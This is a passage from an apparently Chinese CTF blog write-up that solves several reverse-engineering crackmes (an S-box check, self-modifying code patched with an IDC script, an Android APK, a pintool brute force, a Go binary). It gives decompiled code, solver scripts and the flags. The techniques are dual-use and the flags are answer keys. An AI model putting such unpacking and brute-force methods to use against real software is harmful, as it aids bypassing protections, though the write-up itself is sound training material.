tmp_char; <span class="hljs-comment">// al</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// esi</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// edi</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v8; <span class="hljs-comment">// al</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v10; <span class="hljs-comment">// cl</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  _input = input;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( length != <span class="hljs-number">35</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;</span><br><span class="line">  index = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    tmp_char = *(_BYTE *)(index + _input);</span><br><span class="line">    v6 = (tmp_char &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>;</span><br><span class="line">    v7 = (<span class="hljs-number">16</span> * tmp_char &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>;</span><br><span class="line">    v8 = byte_402150[<span class="hljs-number">2</span> * index];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-string">'0'</span> || v8 &gt; <span class="hljs-string">'9'</span> )</span><br><span class="line">      v9 = v8 - <span class="hljs-string">'W'</span>;</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">      v9 = v8 - <span class="hljs-string">'0'</span>;</span><br><span class="line">    v10 = byte_402151[<span class="hljs-number">2</span> * index];</span><br><span class="line">    v11 = <span class="hljs-number">16</span> * v9;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v10 &lt; <span class="hljs-string">'0'</span> || v10 &gt; <span class="hljs-string">'9'</span> )</span><br><span class="line">      v12 = v10 - <span class="hljs-string">'W'</span>;</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">      v12 = v10 - <span class="hljs-string">'0'</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)byte_4021A0[<span class="hljs-number">16</span> * v6 + v7] != ((v11 + v12) ^ <span class="hljs-number">0x19</span>) )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( ++index &gt;= <span class="hljs-number">35</span> )</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>处理了半天，高四位低四位的处理来处理去，最后还要合在一起……</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">target = [</span><br><span class="line">    <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>,</span><br><span class="line">    <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>,</span><br><span class="line">    <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>,</span><br><span class="line">    <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>,</span><br><span class="line">    <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>,</span><br><span class="line">    <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>,</span><br><span class="line">    <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>,</span><br><span class="line">    <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>,</span><br><span class="line">    <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>,</span><br><span class="line">    <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>,</span><br><span class="line">    <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>,</span><br><span class="line">    <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>,</span><br><span class="line">    <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>,</span><br><span class="line">    <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>,</span><br><span class="line">    <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>,</span><br><span class="line">    <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>,</span><br><span class="line">    <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>,</span><br><span class="line">    <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>,</span><br><span class="line">    <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>,</span><br><span class="line">    <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>,</span><br><span class="line">    <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>,</span><br><span class="line">    <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>,</span><br><span class="line">    <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>,</span><br><span class="line">    <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>,</span><br><span class="line">    <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>,</span><br><span class="line">    <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span></span><br><span class="line">]</span><br><span class="line">var = [<span class="hljs-number">0x2a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x49</span>,</span><br><span class="line">       <span class="hljs-number">0x54</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xe6</span>]</span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> var:</span><br><span class="line">    tmp = target.index(i^<span class="hljs-number">0x19</span>)</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(tmp)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{Th<span class="hljs-number">1</span>s_<span class="hljs-number">1</span>s_Simple_Rep<span class="hljs-number">1</span>ac<span class="hljs-number">3</span>_Enc<span class="hljs-number">0</span>d<span class="hljs-number">3</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h4><p>又是一道SMC，不知道为什么最近遇到的还是挺多的</p><p>没有任何加密，IDA打开</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">181</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    envp = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **)(*((<span class="hljs-keyword">unsigned</span> __int8 *)judge + i) ^ <span class="hljs-number">0xC</span>u);</span><br><span class="line">    *((_BYTE *)judge + i) ^= <span class="hljs-number">0xC</span>u;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input flag:"</span>, argv, envp);</span><br><span class="line">  __isoc99_scanf(<span class="hljs-string">"%20s"</span>, &amp;s);</span><br><span class="line">  v5 = <span class="hljs-built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">14</span> &amp;&amp; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-built_in">judge</span>((__int64)&amp;s) )</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Right!"</span>);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wrong!"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>经典的输入然后验证，不过<code>judge</code>函数是打不开的，看前面的操作，典型的SMC，写个IDC脚本跑一下</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">auto</span> judge, addr,tmp;</span><br><span class="line">    judge = <span class="hljs-number">0x600B00</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> i;</span><br><span class="line">    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">181</span>; ++i )</span><br><span class="line">    {</span><br><span class="line">        addr=judge+i;</span><br><span class="line">        tmp=<span class="hljs-built_in">Byte</span>(addr);</span><br><span class="line">        tmp=tmp^ <span class="hljs-number">0xC</span>;</span><br><span class="line">        <span class="hljs-built_in">PatchByte</span>(addr,tmp);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-built_in">Message</span>(<span class="hljs-string">"Down!"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后改一下<code>judge</code>函数的结束位置，<code>F5</code>分析，逻辑很好懂</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">signed</span> __int64 __fastcall <span class="hljs-title">judge</span><span class="hljs-params">(__int64 a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 v2; <span class="hljs-comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  *(&amp;v2 - <span class="hljs-number">5</span>) = a1;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">32</span>) = <span class="hljs-number">0x66</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">31</span>) = <span class="hljs-number">0x6D</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">30</span>) = <span class="hljs-number">0x63</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">29</span>) = <span class="hljs-number">0x64</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">28</span>) = <span class="hljs-number">0x7F</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">27</span>) = <span class="hljs-number">0x6B</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">26</span>) = <span class="hljs-number">0x37</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">25</span>) = <span class="hljs-number">0x64</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">24</span>) = <span class="hljs-number">0x3B</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">23</span>) = <span class="hljs-number">0x56</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">22</span>) = <span class="hljs-number">0x60</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">21</span>) = <span class="hljs-number">0x3B</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">20</span>) = <span class="hljs-number">0x6E</span>;</span><br><span class="line">  *((_BYTE *)&amp;v2 - <span class="hljs-number">19</span>) = <span class="hljs-number">0x70</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( *((_DWORD *)&amp;v2 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>; *((_DWORD *)&amp;v2 - <span class="hljs-number">1</span>) &lt;= <span class="hljs-number">13</span>; ++*((_DWORD *)&amp;v2 - <span class="hljs-number">1</span>) )</span><br><span class="line">    *(_BYTE *)(*((<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> *)&amp;v2 - <span class="hljs-number">1</span>) + *(&amp;v2 - <span class="hljs-number">5</span>)) ^= *((_DWORD *)&amp;v2 - <span class="hljs-number">1</span>);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( *((_DWORD *)&amp;v2 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>; *((_DWORD *)&amp;v2 - <span class="hljs-number">1</span>) &lt;= <span class="hljs-number">13</span>; ++*((_DWORD *)&amp;v2 - <span class="hljs-number">1</span>) )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(_BYTE *)(*((<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> *)&amp;v2 - <span class="hljs-number">1</span>) + *(&amp;v2 - <span class="hljs-number">5</span>)) != *((_BYTE *)&amp;v2 + *((<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> *)&amp;v2 - <span class="hljs-number">1</span>) - <span class="hljs-number">32</span>) )</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里其实有三个变量，<code>&amp;v2-1</code>的位置是一个整型，实际上是索引值，<code>&amp;v2-5</code>是我们输入的字符串，<code>&amp;v2-19</code>是最终的目标，只有一个异或操作，很简单就可以跑出来结果</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">0x66</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x70</span>]</span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(target[i] ^ i)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{n<span class="hljs-number">1</span>c<span class="hljs-number">3</span>_j<span class="hljs-number">0</span>b}</span><br></pre></td></tr></tbody></table></figure><h4 id="What-does-this-button-do"><a href="#What-does-this-button-do" class="headerlink" title="What-does-this-button-do"></a>What-does-this-button-do</h4><p>不知道为什么这题放在了这个位置，简单得不能再简单的一个mobile</p><p>jadx打开，很快就可以找到关键代码</p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>{</span><br><span class="line">       <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">       setContentView(R.layout.activity_flag);</span><br><span class="line">       String flag = <span class="hljs-string">""</span>;</span><br><span class="line">       <span class="hljs-keyword">int</span>[] d = {<span class="hljs-number">102</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">103</span>, <span class="hljs-number">123</span>, <span class="hljs-number">119</span>, <span class="hljs-number">52</span>, <span class="hljs-number">110</span>, <span class="hljs-number">110</span>, <span class="hljs-number">52</span>, <span class="hljs-number">95</span>, <span class="hljs-number">106</span>, <span class="hljs-number">52</span>, <span class="hljs-number">114</span>, <span class="hljs-number">95</span>, <span class="hljs-number">109</span>, <span class="hljs-number">121</span>, <span class="hljs-number">95</span>, <span class="hljs-number">100</span>, <span class="hljs-number">51</span>, <span class="hljs-number">120</span>, <span class="hljs-number">125</span>};</span><br><span class="line">       <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">22</span>; i++) {</span><br><span class="line">           flag = flag.concat(String.valueOf((<span class="hljs-keyword">char</span>) d[i]));</span><br><span class="line">       }</span><br><span class="line">       ((TextView) findViewById(R.id.flagText)).setText(flag);</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure><p>然后直接输出把flag输出就可以了</p><p>不过这题要去掉外面的<code>flag{}</code>提交</p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w<span class="hljs-number">4</span><span class="hljs-symbol">nn4</span>_j<span class="hljs-number">4</span>r_my_d<span class="hljs-number">3</span>x</span><br></pre></td></tr></tbody></table></figure><h4 id="76号"><a href="#76号" class="headerlink" title="76号"></a>76号</h4><p>单字检测，pintools爆破，得到flag</p><p>直接<a href="https://github.com/ChrisTheCoolHut/PinCTF">滚轮子</a></p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{<span class="hljs-number">09</span>vdf<span class="hljs-number">7</span>wefijbk}</span><br></pre></td></tr></tbody></table></figure><h4 id="easy-go"><a href="#easy-go" class="headerlink" title="easy_go"></a>easy_go</h4><p>这题根据名字也知道是go逆向，IDA打开是乱七八糟的函数，也没有任何的symbol，用go重命名的插件给函数重命名，发现一个base64的解码函数和奇怪的字符串，字母表不是很清楚，动态调试一下</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 